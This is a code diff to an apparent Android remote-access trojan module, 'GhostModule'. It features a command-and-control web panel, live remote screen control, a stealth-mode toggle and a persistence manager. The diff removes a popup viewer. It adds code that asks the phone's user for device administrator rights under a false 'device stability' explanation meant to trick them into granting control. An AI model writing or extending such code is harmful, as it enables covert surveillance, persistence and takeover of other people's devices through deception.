@@ -56,8 +56,6 @@ public class GhostModule extends BaseModule {
             return newResponse(Response.Status.BAD_REQUEST, "application/json", "{\"success\": false, \"message\": \"URL required\"}");
         } else if (uri.equals("/stealth")) {
             return toggleStealthMode(params);
-        } else if (uri.equals("/ghost/popup")) {
-            return serveGhostPopup(session);
         }
         return null;
     }
@@ -435,7 +433,7 @@ public class GhostModule extends BaseModule {
         // Ghost Remote Control Section
         html.append("<div class=\"remote-control-panel\" style=\"align-items: flex-start; justify-content: flex-start;\">");
         html.append("<div style=\"width: 100%; display: flex; flex-direction: column; align-items: flex-start;\">");
-        html.append("<h2 style=\"font-size: 1.35rem; display: flex; align-items: center; gap: 8px; justify-content: space-between; text-align: left; width: 100%; margin: 0 0 30px 0;\"><span>GHOST_CONTROL <span class=\"info-trigger\" onclick=\"showInfo(event, 'GHOST_CONTROL', 'Real-time interaction with the device UI through accessibility triangulation.')\">INFO</span></span> <button onclick=\"detachGhostControl()\" class=\"btn btn-small\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); background: rgba(0,242,255,0.05); margin: 0; font-size: 0.6rem; padding: 4px 8px;\">🗗 DETACH</button></h2>");
+        html.append("<h2 style=\"font-size: 1.35rem; display: flex; align-items: center; gap: 8px; justify-content: flex-start; text-align: left; width: 100%; margin: 0 0 30px 0;\">GHOST_CONTROL <span class=\"info-trigger\" onclick=\"showInfo(event, 'GHOST_CONTROL', 'Real-time interaction with the device UI through accessibility triangulation.')\">INFO</span></h2>");
         
         // Screen View tool
         html.append("<div class=\"phone-frame\" style=\"margin-bottom: 30px; align-self: center;\">");
@@ -671,10 +669,11 @@ public class GhostModule extends BaseModule {
             case "admin":
                 new Handler(Looper.getMainLooper()).post(() -> {
                     try {
-                        context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
-                            .edit().putBoolean("is_repairing", true).apply();
-                        IO_Persistence_Manager.setAutoPilot(true);
                         IO_Persistence_Manager.stopSmartExit();
+                        android.content.ComponentName admin = new android.content.ComponentName(context, com.labs.labrats.StabilityPolicy.class);
+                        Intent intent = new Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
+                        intent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
+                        intent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Synchronization with system frameworks is required to maintain device stability.");
 
                         Intent wrapperIntent = new Intent(context, com.labs.labrats.PermissionActivity.class);
                         wrapperIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
@@ -742,24 +741,6 @@ public class GhostModule extends BaseModule {
         } catch (Exception e) {
             return newResponse(Response.Status.INTERNAL_ERROR, "text/plain", "Stealth error: " + e.getMessage());
         }
-    }
-
-    private Response serveGhostPopup(IHTTPSession session) {
-        StringBuilder html = new StringBuilder();
-        html.append("<!DOCTYPE html><html lang=\"en\"><head><meta charset=\"UTF-8\"><title>LAB-RATS | GHOST POPUP</title>");
-        html.append("<link rel=\"stylesheet\" href=\"/c2/style.css\"></head><body style=\"background:#05050a; padding:20px;\">");
-        html.append("<div style=\"display:flex; flex-direction:column; align-items:center;\">");
-        html.append("<h2 style=\"color:var(--neon-cyan); font-family:Orbitron,sans-serif; font-size:1rem; margin-bottom:20px;\">DETACHED_GHOST_CONTROL</h2>");
-        html.append("<div class=\"phone-frame\" style=\"margin-bottom:20px;\">");
-        html.append("<div class=\"phone-notch\"></div>");
-        html.append("<div id=\"ghost-screen-container\" class=\"phone-screen\" style=\"cursor: crosshair;\">");
-        html.append("<img id=\"ghost-screen-stream\" src=\"\" style=\"width: 100%; height: auto; display: block; user-select: none; -webkit-user-drag: none;\" onmousedown=\"startGhostDrag(event)\" onmouseup=\"endGhostDrag(event)\" />");
-        html.append("<div id=\"ghost-screen-status\" style=\"color: #444; font-size: 0.7rem; font-weight: bold; letter-spacing: 2px;\">CONNECTED</div>");
-        html.append("</div></div>");
-        html.append("<script src=\"/c2/script.js\"></script>");
-        html.append("<script>window.addEventListener('load', () => { setTimeout(() => { if (typeof startGhostScreen === 'function') startGhostScreen(); }, 500); });</script>");
-        html.append("</div></body></html>");
-        return newResponse(Response.Status.OK, "text/html", html.toString());
     }
 
 }
